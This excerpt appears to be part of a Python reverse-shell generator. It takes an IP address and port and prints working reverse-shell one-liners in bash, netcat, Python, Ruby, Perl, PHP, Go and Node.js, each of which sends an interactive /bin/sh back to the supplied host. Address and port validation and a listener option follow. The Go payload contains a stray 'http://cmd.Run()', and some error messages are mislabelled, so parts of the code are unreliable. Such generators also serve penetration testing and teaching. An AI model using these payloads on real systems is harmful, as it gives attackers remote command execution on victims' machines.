...
def bash_rs():
    print(ANSI.white_color() + "\nYou selected Bash Reverse Shell. Output : ")
    bash = ANSI.yellow_color() + "bash -i >& /dev/tcp/" + \
        ip_addr + "/" + port + " 0>&1"
    print(bash)
...
def netcat_rs():
    ...
    netcat = ANSI.yellow_color() + "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
        ip_addr + " " + port + " >/tmp/f"
    print(netcat)
...
def python_rs():
    ...
    python = ANSI.yellow_color() + "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + \
        ip_addr + "\"," + port + \
...
def python3_rs():
    ...
    python3 = ANSI.yellow_color() + "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + \
        ip_addr + "\"," + port + \
        "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    print(python3)
...
def ruby_rs():
    ...
    ruby = ANSI.yellow_color() + "ruby -rsocket -e'f=TCPSocket.open(\"" + ip_addr + \
        "\"," + port + \
...
def perl_rs():
    ...
    perl = ANSI.yellow_color() + "perl -e 'use Socket;$i=\"" + ip_addr + "\";$p=" + port + \
...
def php_rs():
    ...
    php = ANSI.yellow_color() + "php -r '$sock=fsockopen(\"" + ip_addr + "\"," + \
...
def golang_rs():
    print(ANSI.white_color() + "\nYou selected Golang Reverse Shell. Output : ")
    golang = ANSI.yellow_color() + "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + ip_addr + ":" + \
        port + \
        "\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go"
    print(golang)


def nodeJs_rs():
    print(ANSI.white_color() + "\nYou selected Node.js Reverse Shell. Output : ")
    nodeJs = ANSI.yellow_color() + "require('child_process').exec('bash -i >& /dev/tcp/" + \
        ip_addr + "/" + port + " 0>&1');"
    print(nodeJs)
...
def menu():
    ...
    10 - Node.js Reverse Shell (Requires Bash on the target machine)
    ...
    def check_ipv4_address():
        ...
        if len(parts) != 4:
            print(ANSI.red_color() +
                  "[-] Invalid IPv4 Address ! The format must be like ; a.b.c.d")
            quit()
        if '' in parts or ' ' in parts:
            print(ANSI.red_color(
            ) + "[-] Invalid IPv4 Address ! No spaces or blank caracters allowed.")
            quit()
        for item in parts:
            if not item.isnumeric():
                print(ANSI.red_color() +
                      "[-] Invalid IPv4 Address ! No special caracters allowed.")
                quit()
        ...
        for item in parts:
            if item == item in invalid:
                print(ANSI.red_color(
                ) + "[-] Invalid IPv4 address ! Zeros are not allowed at the beginning of the numbers")
                quit()

        if 0 <= int(parts[0]) <= 255 and 0 <= int(parts[1]) <= 255 and 0 <= int(parts[2]) <= 255 and 0 <= int(parts[3]) <= 255:
            print(ANSI.green_color() + "[+] " +
                  ip_addr + " is a valid IPv4 address")
            check_port()

        else:
            print(ANSI.red_color() +
                  "[-] Invalid IPv4 Address ! The allowed port range is : 0 - 255")
            quit()
    ...
    def check_ipv6_address(ip_addr):
        try:
            ...
            print(ANSI.green_color() + "[+] " +
                  ip_addr + " is a valid IPv6 address")
            check_port()
    ...
    def check_port():
        if not port.isnumeric():
            print(ANSI.red_color(
            ) + "[-] Invalid Port ! No spaces or blank/special caracters allowed.")
            quit()
        elif not 0 <= int(port) <= 65535:
            print(ANSI.red_color() +
                  "[-] Invalid Port ! The allowed port range is : 0 - 65535")
            quit()
        else:
    ...
    def listen():
        try:
            ...
            if not 1024 <= int(port):
                ...
                port = input(ANSI.white_color() +
                             "Change port number ? y/N > ")
                if port == "y" or port == "Y":
                    port = input("Specify a local port > ")
